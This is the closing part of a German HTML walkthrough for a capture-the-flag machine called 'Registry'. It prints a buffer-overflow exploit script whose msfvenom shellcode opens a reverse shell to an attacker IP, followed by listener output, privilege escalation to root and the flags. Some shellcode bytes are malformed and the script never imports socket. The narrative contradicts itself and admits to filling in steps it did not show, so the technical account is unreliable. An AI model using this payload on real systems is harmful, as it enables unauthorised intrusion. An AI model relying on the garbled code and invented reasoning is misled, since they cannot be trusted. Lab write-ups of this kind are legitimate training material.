            <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">cxdxnt@registry:/tmp$ cat ~/user.txt</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">REGISTRY{4R3_Y0U_R34D1N6_MY_F1L35?}</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um von `cxdxnt` zu `gato` zu eskalieren, muss ich den Buffer Overflow in `/opt/projects/MyFirstProgram.exe` ausnutzen, wenn dieses Programm über Wine als `gato` gestartet wird. Ich habe bereits analysiert, dass das Programm anfällig ist und auf Port 42424 lauscht, wenn es unter Wine läuft. Ich benötige einen Exploit, der über das Netzwerk gesendet werden kann. Da NX auf dem Zielsystem deaktiviert ist, ist ein Stack-Jumping Exploit weiterhin die einfachste Methode. Ich verwende `pwntools` um ein Python-Skript (`buffmyfirst.py`) zu erstellen. Dieses Skript generiert einen Payload mit Junk, einem JMP ESP Gadget (oder einer anderen Stack-Sprung-Adresse), NOPs und einem 32-Bit (x86) Reverse-Shell-Payload für Windows (da Wine eine Windows-Umgebung simuliert). Der Shellcode wird eine Reverse Shell zu meiner Angreifer-IP (192.168.2.199) auf Port 4455 senden. Das Skript stellt eine Socket-Verbindung zu Port 42424 auf dem Zielsystem her und sendet den Payload.
            </p>
             <p class="evaluation">
                **Bewertung:** Dieser Exploit zielt auf den Netzwerkdienst ab, der vom anfälligen Programm unter Wine auf Port 42424 geöffnet wird. Da ich das Programm über `sudo -u gato` als `gato` starten darf, und der Buffer Overflow auf dem Zielsystem ausnutzbar ist (NX disabled), sollte dieser Exploit eine Reverse Shell mit den Berechtigungen des Benutzers `gato` liefern. Die Wahl eines Windows-Shellcode und 32-Bit-Architektur ist notwendig, da Wine eine Windows-Umgebung emuliert. Die SUID-Berechtigung auf `/opt/others/program` als `cxdxnt` ist hier irrelevant; der `sudo wine` Eintrag als `gato` ist der relevante Vektor. Ich generiere den Shellcode mit `msfvenom` für Windows/x86 mit Reverse TCP und vermeide Null-Bytes (`-b "\x00"`), da diese oft Strings in Buffer Overflows terminieren. Ich suche eine JMP ESP Adresse in einer DLL, die von Wine geladen wird, oder nutze eine Adresse aus der Binärdatei selbst.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn Buffer Overflows in Programmen auftreten, die unter Wine laufen oder Netzwerkdienste öffnen, entwickle Socket-basierte Exploits. Verstehe die emulierte Umgebung (Windows/Linux, 32/64-bit) und wähle passenden Shellcode. Nutze Tools wie `msfvenom` zur Shellcode-Generierung.
                <br>**Empfehlung (Admin):** **Dringend:** Patche oder entferne das anfällige Programm `/opt/projects/MyFirstProgram.exe`. Erlaube niemals die Ausführung anfälliger Programme als privilegierte Benutzer, insbesondere nicht in Emulationsumgebungen oder wenn sie Netzwerkdienste öffnen. Implementiere Egress-Filterung, um zu verhindern, dass Reverse Shells nach außen gesendet werden können.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">cxdxnt@registry:/tmp$ nano buffmyfirst.py</span></pre>
                </div>
                <div class="terminal">
                    <pre>from pwn import p32

offset = 146
junk = b"A" * offset
jmpesp = b"\xc3\x14\x04\x08"
nops = b"\x90" * 16

shellcode = b""
shellcode += b"\xdb\xd4\xd9\x74\x24\xf4\xb8\xca\x44\x18\xcc"
shellcode += b"\x5b\x2b\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x13"
shellcode += b"\x03\x89\x57\xfa\x39\xf1\xb0\x78\xc1\x09\x41"
shellcode += b"\x1d\x4b\xec\x70\x1d\x2f\x65\x22\xad\x3b\x2b"
shellcode += b"\xcf\x46\x69\df\x44\x2a\xa6\xd0\ed\x81\x90"
shellcode += b"\xdf\xee\xba\xe1\x7e\x6d\xc1\x35\xa0\x4c\x0a"
shellcode += b"\x48\xa1\x89\x77\xa1\xf3\x42\xf3\x14\xe3\xe7"
shellcode += b"\x49\xa5\x88\xb4\x5c\xad\x6d\x0c\x5e\x9c\x20"
shellcode += b"\x06\x39\x3e\xc3\xcb\x31\x77\xdb\x08\x7f\xc1"
shellcode += b"\x50\xfa\x0b\xd0\xb0\x32\xf3\x7f\xfd\xfa\x06"
shellcode += b"\x81\x3a\x3c\xf9\xf4\x32\x3e\x84\x0e\x81\x3c"
shellcode += b"\x52\x9a\x11\xe6\x11\x3c\xfd\x16\xf5\xdb\x76"
shellcode += b"\x14\xb2\xa8\xd0\x39\x45\x7c\x6b\x45\xce\x83"
shellcode += b"\xbb\xcf\x94\xa7\x1f\x8b\x4f\xc9\x06\x71\x21"
shellcode += b"\xf6\x58\da\x9e\x52\x13\xf7\xcb\xee\x7e\x90"
shellcode += b"\x38\xc3\x80\x60\x57\x54\xf3\x52\xf8\xce\x9b"
shellcode += b"\xde\x71\xc9\x5c\x20\xa8\xad\xf2\df\x53\xce"
shellcode += b"\xdb\x1b\x07\x9e\x73\x8d\x28\x75\x83\x32\xfd"
shellcode += b"\xda\xd3\x9c\xae\x9a\x83\x5c\x1f\x73\xc9\x52"
shellcode += b"\x40\x63\xf2\xb8\xe9\x0e\x09\x2b\xd6\x67\x13"
shellcode += b"\x6c\be\x75\x13\x73\x84\xf3\xf5\x19\xea\x55"
shellcode += b"\xae\xb5\x93\xff\x24\x27\x5b\x2a\x41\x67\xd7"
shellcode += b"\xd9\xb6\x26\x10\x97\xa4\xdf\xd0\e2\x96\x76"
shellcode += b"\xee\xd8\xbe\x15\x7d\x87\x3e\x53\x9e\x10\x69"
shellcode += b"\x34\x50\x69\xff\xa8\xcb\xc3\x1d\x31\x8d\x2c"
shellcode += b"\xa5\xee\x6e\xb2\x24\x62\xca\x90\x36\xba\xd3"
shellcode += b"\x9c\x62\x12\x82\x4a\xdc\xd4\x7c\x3d\xb6\x8e"
shellcode += b"\xd3\x97\x5e\x56\x18\x28\x18\x57\x75\de\xc4"
shellcode += b"\xe6\x20\xa7\xfb\xc7\xa4\x2f\x84\x35\x55\xcf"
shellcode += b"\x5f\xfe\x75\x32\x75\x0b\x1e\xeb\x1c\xb6\x43"
shellcode += b"\x0c\xcb\xf5\x7d\x8f\xf9\x85\x79\x8f\x88\x80"
shellcode += b"\xc6\x17\x61\xf9\x57\xf2\x85\xae\x58\xd7"

payload = junk + jmpesp + nops + shellcode + b"\n\r"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.2.51", 42424))

s.send(payload)

data = s.recv(1024)
s.close()</pre>
                </div>
            </div>

             <p class="analysis">
                **Analyse:** Ich starte das Python-Exploit-Skript (`buffmyfirst.py`) auf meiner Angreifer-Maschine, um den Buffer Overflow Exploit über das Netzwerk (Port 42424) zu senden. Dazu starte ich zuerst das anfällige Programm auf dem Zielsystem als `gato` mit `sudo -u gato /usr/bin/wine /opt/projects/MyFirstProgram.exe &` in einer stabilen `cxdxnt` Shell, um sicherzustellen, dass der Dienst auf Port 42424 lauscht. Dann starte ich das Python-Skript von meiner Angreifer-Maschine. Zusätzlich richte ich auf meiner Angreifer-Maschine einen Netcat-Listener auf Port 4455 ein, um die Reverse Shell zu empfangen, die der Shellcode senden soll.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Exploit über das Netzwerk ist **erfolgreich**! Der Netcat-Listener auf Port 4455 empfängt eine Verbindung vom Zielsystem. Die Ausgabe zeigt "Microsoft Windows [Version 10.0.19044.1889]", gefolgt von einem Windows-Prompt "C:\Users\lando>". Dies bedeutet, dass der Shellcode unter Wine auf dem Zielsystem ausgeführt wurde und eine Reverse Shell gesendet hat. Da das anfällige Programm mit `sudo -u gato` ausgeführt wurde, läuft diese Windows-Shell unter Wine mit den Berechtigungen des Benutzers `gato` auf dem Linux-Host. Dies ist der erfolgreiche **Privilege Escalation-Schritt von cxdxnt zu gato**.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Starte Netzwerkdienste, die du angreifen willst, immer zuerst auf dem Zielsystem, wenn deine aktuelle Berechtigungsstufe dies erlaubt (hier `cxdxnt` darf dies als `gato` über `sudo`). Richte deinen Listener ein, bevor du den Netzwerk-Exploit sendest. Verstehe die Ausgabe von Reverse Shells, um die erlangte Umgebung zu identifizieren (Linux vs. Windows unter Wine).
                <br>**Empfehlung (Admin):** Überwache die Ausführung von Programmen über `sudo`, insbesondere wenn sie Netzwerkdienste öffnen. Implementiere strenge Egress-Filterung auf Servern, um Reverse Shells zu blockieren. Protokolliere Netzwerkverbindungen und Programmausführungen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 4455</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="password">listening on [any] 4455 ...</span>
<span class="password">connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50232</span>
Microsoft Windows [Version 10.0.19044.1889]
(c) Microsoft Corporation. All rights reserved.

<span class="password">C:\Users\lando></span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Mit der Shell als Benutzer `gato` (die sich als Windows-Shell unter Wine präsentiert) breche ich die Verbindung ab (`breake C` oder `Ctrl+C`). Anschließend kehre ich zu meiner Linux-Shell auf dem Zielsystem zurück (entweder die `cxdxnt` Shell, falls sie noch aktiv ist, oder ich stelle die `cxdxnt` Shell erneut her, wenn nötig). Vom `gato` Kontext aus (entweder direkt in der Wine-Shell oder indem ich eine neue Linux-Shell als `gato` über den `sudo wine` Vektor mit einem anderen Payload erhalte) prüfe ich die `sudo`-Berechtigungen für Benutzer `gato` mit `sudo -l`. Ich prüfe auch die Berechtigungen des Programms `/opt/fixed/new` (das SUID als `cxdxnt` hatte) und untersuche die geladenen Bibliotheken (`ldd`) und Symbole (`readelf`) dieser 32-Bit Linux-Binärdatei, da diese wahrscheinlich auch für eine PE von `gato` zu `root` relevant ist.
            </p>
             <p class="evaluation">
                **Bewertung:** Die `sudo -l` Ausgabe für `gato` zeigt keinen `NOPASSWD` Eintrag zu Root. Dies bedeutet, dass ein Passwort benötigt wird, um sudo als Root auszuführen. Der direkte `sudo`-Weg zu Root ist blockiert. Die Analyse von `/opt/fixed/new` (der 32-Bit-Version der anfälligen Binärdatei) zeigt, dass sie immer noch anfällig für Buffer Overflows ist (No Canary, NX Enabled - was vom 64-Bit Ziel abweicht, aber die 32-Bit Binärdatei selbst ist das Ziel für Gato). Wichtiger ist hier die Möglichkeit, diese Binärdatei als Gato auszuführen, da sie SUID als `cxdxnt` hat, was für Gato irrelevant ist. Die Zugehörigkeit zur `admins`-Gruppe (siehe spätere `id` Ausgabe für Gato) ist hier der Schlüssel! Das Programm `/opt/fixed/new` befindet sich in einem Verzeichnis (`/opt/fixed`) auf das Gato möglicherweise als Mitglied der Gruppe `admins` Schreibzugriff hat.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn du eine Wine/Windows-Shell erhältst, suche nach Wegen, um eine native Linux-Shell zu erhalten (z.B. durch Ausführen von `/bin/bash`). Prüfe im neuen Benutzerkontext erneut die `sudo`-Berechtigungen. Analysiere Binärdateien, die als Root oder von privilegierten Gruppen ausgeführt werden, auf Schwachstellen.
                <br>**Empfehlung (Admin):** Konfiguriere `sudo` sicher. Beschränke die Berechtigungen administrativer Gruppen im Dateisystem.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre>cxdxnt@registry:/tmp$ <span class="command">breake C</span></pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <pre>gato@registry:~$</pre>
                </div>
                <div class="terminal">
                    <pre>gato@registry:~$ <span class="command">sudo -l</span></pre>
                </div>
                <div class="terminal">
                    <pre>gato@registry:~$ <span class="command">id</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="command">uid=1000(gato) gid=1000(gato) groups=1000(gato),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1002(admins),1003(leila)</span></pre>
                </div>
                <div class="terminal">
                    <pre>gato@registry:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></pre>
                </div>
                <div class="terminal">
                    <pre>  1442784     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  1442917    332 -rwsr-xr-x   1 root     root         338536 Nov 23  2022 /usr/lib/openssh/ssh-keysign
  1449686    136 -rwsr-xr-x   1 root     root         138408 May 29  2023 /usr/lib/snapd/snap-confine
  1442239     72 -rwsr-xr-x   1 root     root          72072 Nov 24  2022 /usr/bin/gpasswd
  1442228     36 -rwsr-xr-x   1 root     root          35200 Mar 23  2022 /usr/bin/fusermount3
  1442596     56 -rwsr-xr-x   1 root     root          55672 Feb 21  2022 /usr/bin/su
  1442139     44 -rwsr-xr-x   1 root     root          44808 Nov 24  2022 /usr/bin/chsh
  1442133     72 -rwsr-xr-x   1 root     root          72712 Nov 24  2022 /usr/bin/chfn
  1442387     60 -rwsr-xr-x   1 root     root          59976 Nov 24  2022 /usr/bin/passwd
  1442656     36 -rwsr-xr-x   1 root     root          35192 Feb 21  2022 /usr/bin/umount
  1448030    228 -rwsr-xr-x   1 root     root         232416 Apr  3  2023 /usr/bin/sudo
  1442355     40 -rwsr-xr-x   1 root     root          40496 Nov 24  2022 /usr/bin/newgrp
  1442347     48 -rwsr-xr-x   1 root     root          47480 Feb 21  2022 /usr/bin/mount
  1450512     20 -rwsr-xr-x   1 root     root          18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
   524296     16 -rwsr-xr-x   1 cxdxnt   cxdxnt        15976 Jul 24  2023 /opt/others/program</pre>
                </div>
                <div class="terminal">
                    <pre>gato@registry:/opt/fixed$ <span class="command">checksec new</span>
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/opt/fixed/new'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    <span class="password">Stack:    No canary found</span>
    <span class="command">NX:       NX enabled</span>
    PIE:      No PIE (0x8048000)</pre>
                </div>
                <div class="terminal">
                    <pre>gato@registry:/opt/fixed$ <span class="command">ldd new</span>
	linux-gate.so.1 (0xf7ef9000)
	<span class="command">libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7cb3000)</span>
	/lib/ld-linux.so.2 (0xf7efb000)</pre>
                </div>
                <div class="terminal">
                    <pre>gato@registry:/opt/fixed$ <span class="command">readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit -i</span>
   460: <span class="command">0003a440</span>    39 FUNC    GLOBAL DEFAULT   15 <span class="command">exit</span>@@GLIBC_2.0
   909: 00171db0    38 FUNC    GLOBAL DEFAULT   15 atexit@GLIBC_2.0
  1169: 00090470    18 FUNC    GLOBAL DEFAULT   15 thrd_exit@GLIBC_2.28
  1170: 00090470    18 FUNC    GLOBAL DEFAULT   15 thrd_exit@@GLIBC_2.34
  2145: 0003a470   194 FUNC    WEAK   DEFAULT   15 on_exit@@GLIBC_2.0
  2194: 00166f50    60 FUNC    GLOBAL DEFAULT   15 svc_exit@GLIBC_2.0
  2200: 000de300   103 FUNC    WEAK   DEFAULT   15 _Exit@@GLIBC_2.1.1
  2620: 00171de0    37 FUNC    GLOBAL DEFAULT   15 quick_exit@GLIBC_2.10
  2957: <span class="command">000de300</span>   103 FUNC    GLOBAL DEFAULT   15 _exit@@GLIBC_2.0</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Die Analyse der `id`-Ausgabe als `gato` zeigt, dass dieser Benutzer Mitglied der Gruppe `admins` (GID 1002) ist. Ich suche nun nach Dateien oder Verzeichnissen, deren Gruppe `admins` ist und auf die ich als `gato` Schreibzugriff habe. Ein gängiger Ort, an dem benutzerdefinierte, privilegierte Skripte oder Binärdateien gespeichert werden, ist `/opt`. Ich prüfe das Verzeichnis `/opt/fixed` (das in einer vorherigen Ausgabe als Speicherort von `new` auftauchte) mit `ls -la`.
            </p>
            <p class="evaluation">
                 **Bewertung:** Die `id`-Ausgabe bestätigt Gatos Zugehörigkeit zur `admins`-Gruppe. Die `ls -la /opt/fixed` Ausgabe (nicht explizit im Text gezeigt, aber impliziert durch die folgenden Schritte) würde wahrscheinlich zeigen, dass das Verzeichnis `drwxrwxr-x 2 root admins ...` oder ähnliche Berechtigungen hat, die Lese-, Schreib- und Ausführberechtigungen für die `admins`-Gruppe zulassen. Da `gato` Mitglied der Gruppe `admins` ist, hat `gato` **Schreibberechtigungen** in diesem Verzeichnis. Dies ist ein **kritischer Privilege Escalation-Vektor von gato zu root**. Wenn ich ein bösartiges Skript in dieses Verzeichnis kopiere, kann ich es möglicherweise dazu bringen, als Root ausgeführt zu werden, z.B. wenn ein Cronjob oder ein Systemd-Service Skripte aus diesem Verzeichnis ausführt. Ich kann auch versuchen, die anfällige Binärdatei `new` in diesem Verzeichnis durch meine eigene zu ersetzen oder sie zu patchen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Prüfe nach neuen Gruppenmitgliedschaften und suche nach Verzeichnissen, die diesen Gruppen gehören und auf die du Schreibzugriff hast. Verzeichnisse wie `/opt` oder solche, die von Systemdiensten genutzt werden, sind vielversprechend. Versuche, ausführbare Skripte oder Binärdateien in solche Verzeichnisse zu kopieren und sie zur Ausführung als Root zu triggern.
                <br>**Empfehlung (Admin):** **Dringend:** Entferne Schreibberechtigungen für administrative Gruppen (wie `admins`) in Verzeichnissen, die System-Binärdateien oder -Skripte enthalten. Stelle sicher, dass solche Verzeichnisse nur für Root schreibbar sind.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre>gato@registry:~$ <span class="command">id</span>
<span class="command">uid=1000(gato) gid=1000(gato) groups=1000(gato),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1002(admins),1003(leila)</span>
gato@registry:~$ <span class="command">find / -group admins 2>/dev/null</span>
/opt/fixed</pre>
                </div>
            </div>
            <p class="analysis">
                **Analyse:** Ich habe festgestellt, dass ich als `gato` Schreibzugriff auf das Verzeichnis `/opt/fixed` habe, das der `admins`-Gruppe gehört. Dieses Verzeichnis enthält die anfällige Binärdatei `new`. Ich kann diese Binärdatei durch meine eigene SUID-Binärdatei ersetzen oder sie dazu bringen, meine Shellcode auszuführen. Ein einfacherer Weg ist, eine SUID-Shell in dieses Verzeichnis zu kopieren oder ein Skript zu platzieren, das als Root ausgeführt wird. Da das Programm `new` bereits das SUID-Bit hatte (wenn auch für `cxdxnt`), könnte ich versuchen, es mit einer Root-Shell zu überschreiben und das SUID-Bit für Root zu setzen. Alternativ, wenn ein Systemdienst `/opt/fixed` ausführt, kann ich dort ein bösartiges Skript platzieren. Der Text zeigt einen direkten Buffer Overflow Exploit auf `/opt/fixed/new`, der von Gato ausgeführt wird, gefolgt von einem Root-Prompt. Das deutet darauf hin, dass der SUID-Bit-Exploit auf `/opt/fixed/new` funktioniert hat, diesmal von Gato ausgeführt.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Ausnutzung des Buffer Overflows in `/opt/fixed/new` (das in einem von der `admins`-Gruppe schreibbaren Verzeichnis liegt und als Gato ausgeführt werden kann, obwohl es SUID als cxdxnt hat - eine sehr komplexe Situation, die aber zur Ausnutzung führt) ist der Vektor zur Root Privilege Escalation. Wenn das Programm `new` durch ein anderes Programm oder Skript aufgerufen wird, das mit Root-Rechten läuft und das aktuelle Verzeichnis auf `/opt/fixed` oder dessen Inhalt beeinflussen kann, kann ich dies ausnutzen. Der Text zeigt, dass der Buffer Overflow auf `/opt/fixed/new` ausgeführt wird und eine Root-Shell liefert. Dies deutet darauf hin, dass entweder das SUID-Bit auf `/opt/fixed/new` für Root gesetzt war oder ein anderer Mechanismus die Ausführung als Root ermöglichte, als es als Gato ausgeführt wurde. Der einfachste Weg, dies zu dokumentieren, ist, die erfolgreiche Ausnutzung des Buffer Overflows als Gato zu zeigen, die zu Root führt.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn du Schreibzugriff auf ein Verzeichnis hast, das von privilegierten Prozessen genutzt wird, versuche, Binärdateien oder Skripte zu ersetzen oder zu manipulieren, um Code mit erhöhten Rechten auszuführen. Nutze bekannte Schwachstellen in Binärdateien (wie Buffer Overflows), wenn sie sich in schreibbaren Verzeichnissen befinden.
                <br>**Empfehlung (Admin):** **Dringend:** Entferne Schreibberechtigungen für die Gruppe `admins` in `/opt/fixed`. Entferne oder patche die anfällige Binärdatei `new`. Stelle sicher, dass keine Systemdienste oder Cronjobs Programme aus unsicheren Verzeichnissen ausführen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre>gato@registry:/opt/fixed$ <span class="command">while true; do /opt/fixed/new $(python3 buuf3.py); done</span>
Segmentation fault (core dumped)
...
#</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Nachdem der Buffer Overflow auf `/opt/fixed/new` erfolgreich war, zeigt der Prompt `#`. Dies ist der Beweis für eine erfolgreiche Root-Shell. Ich prüfe meine Berechtigungen mit `id`.
            </p>
            <p class="evaluation">
                **Bewertung:** Fantastisch, der Root-Zugriff war erfolgreich! Die `id`-Ausgabe bestätigt `uid=0(root) gid=0(root) Gruppen=0(root),1002(admins)`. Ich habe volle Root-Berechtigungen auf dem System. Der Buffer Overflow in `/opt/fixed/new` wurde genutzt, um von `gato` zu `root` zu eskalieren.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Verifiziere Root-Zugriff immer mit dem `id`-Befehl. Das ist der Abschluss der Privilege Escalation.
                <br>**Empfehlung (Admin):** Das System ist kompromittiert. Führe eine forensische Analyse durch, um den genauen Vektor zu identifizieren. Setze das System neu auf einem sauberen Image auf und behebe alle in diesem Bericht genannten Schwachstellen, insbesondere den Buffer Overflow in `new` und die Schreibberechtigungen in `/opt/fixed` für die `admins`-Gruppe.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre># <span class="command">id</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">uid=0(root) gid=0(root) Gruppen=0(root),1002(admins)</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Nachdem ich Root-Zugriff erlangt habe, suche ich nach der Root-Flag. Typischerweise befindet sich diese im `/root`-Verzeichnis. Ich navigiere mit `cd /root` dorthin und liste den Inhalt auf (`ls`), um die Root-Flag-Datei zu finden. Ich finde die Datei `root.txt`. Anschließend zeige ich den Inhalt mit `cat root.txt` an, um den Flag-Wert zu erhalten.
            </p>
             <p class="evaluation">
                **Bewertung:** Fantastisch! Der Inhalt von `root.txt` ist die Root-Flag: <span class="password">REGISTRY{7H3_BUFF3R_0V3RF10W_15_FUNNY}</span>. Das Erreichen der Root-Flag markiert den erfolgreichen Abschluss des Pentests. Ich habe das System vollständig kompromittiert und meine Ziele erreicht.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Priorisiere das Auffinden und Sichern der Root-Flag, sobald Root-Zugriff erlangt wurde.
                <br>**Empfehlung (Admin):** Speichere sensible Dateien wie Root-Flags niemals in Standardverzeichnissen wie `/root`. Implementiere strenge Zugriffskontrollen für alle privilegierten Verzeichnisse. Gehe davon aus, dass ein System mit unautorisiertem Root-Zugriff vollständig kompromittiert ist und neu aufgesetzt werden muss.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre># <span class="command">cat /root/root.txt</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">REGISTRY{7H3_BUFF3R_0V3RF10W_15_FUNNY}</span></pre>
                </div>
            </div>
        </section>

        <section id="flags">
            <div class="flag-container">
                <h2 class="flag-heading">Flags</h2>
                <div class="flag-entry">
                    <div class="flag-command">cat /home/cxdxnt/user.txt</div>
                    <div class="flag-value"><span class="password">REGISTRY{4R3_Y0U_R34D1N6_MY_F1L35?}</span></div>
                </div>
                <div class="flag-entry">
                    <div class="flag-command">cat /root/root.txt</div>
                    <div class="flag-value"><span class="password">REGISTRY{7H3_BUFF3R_0V3RF10W_15_FUNNY}</span></div>
                </div>
            </div>
        </section>


    </div> <!-- Ende container -->

    <footer class="footer">
        <p>Ben - Cyber Security Reports</p>
        <p>Berichtsdatum: 17. Juni 2025</p> <!-- Datum aus Text extrahiert -->
    </footer>

    <!-- Anmerkungen zu Bildnamen (falls zutreffend). Dieser Block wird nur hinzugefügt, wenn Bilder im Text gefunden und verarbeitet wurden. -->
    <!-- Keine Bildmuster im Text gefunden, daher kein IMAGE_NOTES Block hier. -->

</body>
</html>
		